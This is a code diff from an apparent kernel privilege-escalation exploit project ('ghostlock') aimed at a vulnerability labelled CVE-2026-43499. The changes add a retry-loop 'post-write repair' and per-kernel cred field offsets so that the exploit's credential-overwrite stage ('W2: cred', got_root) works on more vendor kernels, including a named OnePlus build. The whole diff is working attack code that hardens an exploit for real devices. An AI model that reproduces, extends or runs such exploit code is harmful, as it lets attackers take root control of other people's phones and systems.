@@ -255,7 +255,9 @@ namespace ghostlock::session::backend {
             useconds_t settle_usec,
             write_stage_verify_fn verify,
             void *context,
-            int32_t leaf) {
+            int32_t leaf,
+            const memory::WriteRequest *post_write = nullptr,
+            const char *post_stage = nullptr) {
 
             /* no attempt can move a target that is wrong by construction, and the
              * stage belongs in the log with the address rather than the route */
@@ -296,6 +298,21 @@ namespace ghostlock::session::backend {
                 }
                 if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                     if (!M::w2_fast_repair_activate(session)) return false;
+                }
+                if (post_write) {
+                    /* The route's own second store landed on a field this stage
+                     * reads back (see docs/analysis/w2-anchored-cred-repair-plan.md);
+                     * repair it with a leaf write before the verify. A missed
+                     * repair is retried from the top like a missed write. */
+                    if (!Cve2026_43499Policy::template attack_write<M>(
+                            session, *post_write, post_stage ? post_stage : stage)) {
+                        support::discard_prebuilt_page();
+                        pr_warning("[T+%.0fms] %s attempt %u: post-write repair "
+                                   "missed; backing off\n",
+                                   attack::timer_ms(), stage, attempt);
+                        usleep(100000);
+                        continue;
+                    }
                 }
                 if (settle_usec) usleep(settle_usec);
                 if (verify(context)) return true;
@@ -463,11 +480,42 @@ namespace ghostlock::session::backend {
             support::run_state::complete("w2b");
 
             support::run_state::enter("w2a");
+            /* The anchored select route's credential write carries a second
+             * store into the object it points at -- init_cred+8 -- so every W2
+             * attempt corrupts the field pair at +8 (uid/gid once `struct cred`
+             * uses `atomic_long_t usage`, gid/suid on the 4-byte form). Repair
+             * it with a leaf write (one store, no collateral) after each cred
+             * write.
+             *
+             * The repair is gated on the *route*, not the kernel version: the
+             * 8-byte usage is a vendor-backport, not a 6.10-only property (the
+             * OnePlus 6.6.66 stock kernel has it), so a release test is wrong
+             * in both directions. The zeroed pair is [uid,gid] or [gid,suid] of
+             * init_cred -- all zero in either layout -- so the write is inert
+             * on the 4-byte-usage families.
+             * See docs/analysis/w2-anchored-cred-repair-plan.md. */
+            memory::WriteRequest w2_repair{};
+            bool have_w2_repair = false;
+            if (g_exploit_session.profile.supports(
+                        ghostlock::profile::RouteKind::SelectStack) &&
+                g_exploit_session.profile.select_stack_layout().lock_anchor_image.has_value()) {
+                const uintptr_t init_cred = session.addresses.data_alias(
+                        session.addresses.init_cred_image_addr());
+                if (init_cred) {
+                    const uint32_t uid_offset =
+                            g_exploit_session.profile.cred_uid_offset().value_or(8);
+                    w2_repair = memory::WriteRequest::make(
+                            init_cred + uid_offset, memory::WriteMode::Zero, /*leaf=*/1);
+                    have_w2_repair = true;
+                }
+            }
             Status got_root = retry_write_stage<M>(
                 session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
                 g_exploit_session.profile.w2_attempts(),
                 g_exploit_session.profile.w2_settle_us(),
-                victim::verify_w2_stage, &w2_context, 0);
+                victim::verify_w2_stage, &w2_context, 0,
+                have_w2_repair ? &w2_repair : nullptr,
+                "W2: init_cred uid repair");
             if (!got_root) {
                 write(pipes.cmd_write.get(), "X", 1);
                 pipes.cmd_write.reset();
@@ -681,8 +729,12 @@ namespace ghostlock::session::backend {
             }
             const memory::WriteRequest usage_pin = memory::WriteRequest::make(
                 init_cred, memory::WriteMode::Zero, /*leaf=*/0);
+            /* The uid/gid pair follows `usage`: +4 on the 4-byte form, +8
+             * once the vendor backports the 8-byte `atomic_long_t`. The
+             * per-image key wins; +4 is the compiled fallback. */
+            const uint32_t uid_offset = session.profile.cred_uid_offset().value_or(4);
             const memory::WriteRequest uid_repair = memory::WriteRequest::make(
-                init_cred + 4, memory::WriteMode::Zero, /*leaf=*/1);
+                init_cred + uid_offset, memory::WriteMode::Zero, /*leaf=*/1);
 
             /* Retried, because a single dance failing is normal: the same reason
              * every other stage carries an attempt ladder. Three tries each, then
